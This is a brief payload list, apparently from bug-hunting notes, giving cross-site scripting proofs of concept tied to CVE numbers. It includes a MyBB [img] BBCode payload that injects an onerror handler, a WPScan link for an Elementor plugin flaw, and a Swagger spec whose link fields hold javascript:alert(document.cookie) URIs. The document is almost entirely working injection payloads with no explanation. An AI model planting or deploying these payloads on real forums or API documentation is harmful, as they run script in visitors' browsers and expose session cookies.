**(CVE-2021-27889)** MyBB forum stored XSS POC: ``[img]http://xyzsomething.com/image?)http://x.com/onerror=alert(1);//[/img]``

**(CVE-2021-24175)** WP plugin Elementor Page Builder:
https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89

**(CVE-unknown)** Swagger XSS old versions (file.json content):

``swagger: "2.0",
info: 
  title: "Swagger Sample App",
  description: "Please to click Terms of service"
  termsOfService: "javascript:alert(document.cookie)"
  contact: 
    name: "API Support",
    url: "javascript:alert(document.cookie)",
    email: "javascript:alert(document.cookie)"
  version: "1.0.1"``
